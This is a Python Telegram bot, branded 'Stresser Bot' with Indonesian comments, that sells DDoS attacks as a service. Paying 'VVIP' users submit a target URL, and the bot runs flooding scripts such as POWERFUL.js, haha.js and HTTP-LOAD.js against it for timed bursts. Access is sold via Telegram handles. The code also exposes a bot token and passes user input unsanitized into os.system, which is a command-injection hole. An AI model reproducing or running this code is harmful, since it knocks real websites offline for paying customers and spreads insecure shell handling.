import telebot
import os
import time

# Inisialisasi bot dengan token bot Anda
bot = telebot.TeleBot('6651346135:AAFcpTGSO78OK1_McMPzcFOvVqRyLFgfu2A')

# Daftar pengguna VVIP
vvip_users = [5581795760]

# Variabel status serangan
is_tls_running = False
is_freeflood_running = False    
is_ddg_running = False
is_cfbypass_running = False
is_cf_running = False
is_rand_running = False
is_gov_running = False
is_sev_running = False
is_brv2_running = False
is_br_running = False 

# Menangani perintah /addvip
@bot.message_handler(commands=['addvip'])
def handle_addvip(message):
    # Verifikasi kredensial pengguna
    if message.from_user.id == 5581795760:
        # Tambahkan pengguna ke daftar pengguna VVIP
        vvip_users.append(message.from_user.id)
        bot.reply_to(message, "User has been successfully registered to the VVIP list")
    else:
        bot.reply_to(message, "You are not an owner.")

# Menangani perintah /tls
@bot.message_handler(commands=['tls'])
def handle_tls(message):
    # Verifikasi pengguna VIP
    if message.from_user.id in vvip_users:
        global is_tls_running
        if not is_tls_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_tls)
        else:
            bot.reply_to(message, "Tls Attack Sent!!!.")
    else:
        bot.reply_to(message, "You don't have access to this feature. If you want to buy access, please contact @fengzzt.")

# Menjalankan serangan tls
def perform_tls(message):
    global is_tls_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent!!!")
    is_tls_running = True
    os.system("node POWERFUL.js " + url + " 60 95500 p.txt")
    time.sleep(60)  # Tunggu selama 60 detik
    is_tls_running = False
    bot.send_message(message.chat.id, "Attack Stopped.")

# Menangani perintah /freeflood
@bot.message_handler(commands=['freeflood'])
def handle_freeflood(message):
    global is_freeflood_running
    if not is_freeflood_running:
        msg = bot.send_message(message.chat.id, "Send url of target:")
        bot.register_next_step_handler(msg, perform_freeflood)
    else:
        bot.reply_to(message, "Wait for process.........")

# Menjalankan serangan freeflood
def perform_freeflood(message):
    global is_freeflood_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent!!!")
    is_freeflood_running = True
    os.system("node POWERFUL.js " + url + " 20 65500 p.txt")
    time.sleep(20)  # Tunggu selama 20 detik
    is_freeflood_running = False
    bot.send_message(message.chat.id, "Attack Stopped")
    
@bot.message_handler(commands=['tlsv2'])
def handle_cfbypass(message):
    # Verifikasi pengguna VVIP
    if message.from_user.id in vvip_users:
        global is_cfbypass_running
        if not is_cfbypass_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_cfbypass)
        else:
            bot.reply_to(message, "Wait process.......")
    else:
        bot.reply_to(message, "You don't have access to this feature. If you want to buy access, please contact @zxkys.")

# Menjalankan serangan DDG
def perform_cfbypass(message):
    global is_cfbypass_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent")
    is_cfbypass_running = True
    os.system("node haha.js " + url + " 60 5000")
    time.sleep(60)  # Tunggu selama 60 detik
    is_cfbypass_running = False
    bot.send_message(message.chat.id, "Attack Stopped.") 
    
@bot.message_handler(commands=['cf'])
def handle_cf(message):
    # Verifikasi pengguna VVIP
    if message.from_user.id in vvip_users:
        global is_cf_running
        if not is_cf_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_cf)
        else:
            bot.reply_to(message, "Wait process.......")
    else:
        bot.reply_to(message, "You don't have access to this feature. If you want to buy access, please contact @zxkys.")

# Menjalankan serangan DDG
def perform_cf(message):
    global is_cf_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent")
    is_cf_running = True
    os.system("node jaja.js " + url + " 60")
    time.sleep(60)  # Tunggu selama 60 detik
    is_cf_running = False
    bot.send_message(message.chat.id, "Attack Stopped.") 

# Menangani perintah /DDG
@bot.message_handler(commands=['ddg'])
def handle_ddg(message):
    # Verifikasi pengguna VVIP
    if message.from_user.id in vvip_users:
        global is_ddg_running
        if not is_ddg_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_ddg)
        else:
            bot.reply_to(message, "Wait process.......")
    else:
        bot.reply_to(message, "You don't have access to this feature. If you want to buy access, please contact @zxkys.")

# Menjalankan serangan DDG
def perform_ddg(message):
    global is_ddg_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent")
    is_ddg_running = True
    os.system("node DDG*" + url + " 60 95500 p.txt 512")
    time.sleep(60)  # Tunggu selama 60 detik
    is_ddg_running = False
    bot.send_message(message.chat.id, "Attack Stopped.") 

# Menangani perintah /stopall
@bot.message_handler(commands=['stopall'])
def handle_stopall(message):
    global is_tls_running, is_freeflood_running, is_ddg_running
    is_tls_running = False
    is_freeflood_running = False
    is_ddg_running = False
    os.system("killall -s KILL node")
    bot.send_message(message.chat.id, "All attacks have been stopped.")

# Menangani pesan teks dari pengguna
@bot.message_handler(commands=['start'])
def handle_message(message):
    if message.from_user.id in vvip_users:
        bot.reply_to(message, "Hello! Welcome to Stresser Bot. You are a VVIP user.")
    else:
        bot.reply_to(message, "Hello! Welcome to Stresser Bot. You are a Noob user.")
        
@bot.message_handler(commands=['author'])
def author (message):
    bot.send_message(message.chat.id, "@zxkys Don't Spam")
  
@bot.message_handler(commands=['help'])
def help (message):
    bot.send_message(message.chat.id, "/freeflood for noob plan/free\n/tls for tls attack (warning: high power)\n/DDG for VVIP plans\nNote: Don't attack go.id or gov.in websites!!!")
    
@bot.message_handler(commands=['rand'])
def handle_rand(message):
    # Verifikasi pengguna VVIP
    if message.from_user.id in vvip_users:
        global is_rand_running
        if not is_rand_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_rand)
        else:
            bot.reply_to(message, "Wait process.......")
    else:
        bot.reply_to(message, "You don't have access to this feature. If you want to buy access, please contact @zxkys.")

# Menjalankan serangan DDG
def perform_rand(message):
    global is_rand_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent")
    is_rand_running = True
    os.system("node rand.js " + url + " 60")
    time.sleep(60)  # Tunggu selama 60 detik
    is_rand_running = False
    bot.send_message(message.chat.id, "Attack Stopped.") 

@bot.message_handler(commands=['browser'])
def handle_br(message):
    # Verifikasi pengguna VVIP
    if message.from_user.id in vvip_users:
        global is_br_running
        if not is_br_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_br)
        else:
            bot.reply_to(message, "Wait process.......")
    else:
        bot.reply_to(message, "You don't have access to this feature. If you want to buy access, please contact @zxkys.")

# Menjalankan serangan DDG
def perform_br(message):
    global is_br_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent")
    is_br_running = True
    os.system("node br.js " + url + " 60 p.txt ua.txt 65500 999")
    time.sleep(60)  # Tunggu selama 60 detik
    is_br_running = False
    bot.send_message(message.chat.id, "Attack Stopped.") 

@bot.message_handler(commands=['sev'])
def handle_sev(message):
    # Verifikasi pengguna VVIP
    if message.from_user.id in vvip_users:
        global is_sev_running
        if not is_sev_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_sev)
        else:
            bot.reply_to(message, "Wait process.......")
    else:
        bot.reply_to(message, "You don't have access to this feature. If you want to buy access, please contact @zxkys.")

# Menjalankan serangan DDG
def perform_sev(message):
    global is_sev_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent")
    is_sev_running = True
    os.system("python3 sef.py" + url + " ")
    time.sleep(60)  # Tunggu selama 60 detik
    is_sev_running = False
    bot.send_message(message.chat.id, "Attack Stopped.") 
    
@bot.message_handler(commands=['randv2'])
def handle_brv2(message):
    # Verifikasi pengguna VVIP
    if message.from_user.id in vvip_users:
        global is_brv2_running
        if not is_brv2_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_brv2)
        else:
            bot.reply_to(message, "Wait process.......")
    else:
        bot.reply_to(message, "You don't have access to this feature. If you want to buy access, please contact @zxkys.")

# Menjalankan serangan DDG
def perform_brv2(message):
    global is_brv2_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent")
    is_brv2_running = True
    os.system("node HTTP-LOAD.js" + url + " 95500 60")
    time.sleep(60)  # Tunggu selama 60 detik
    is_brv2_running = False
    bot.send_message(message.chat.id, "Attack Stopped.") 

# Menjalankan bot
bot.polling()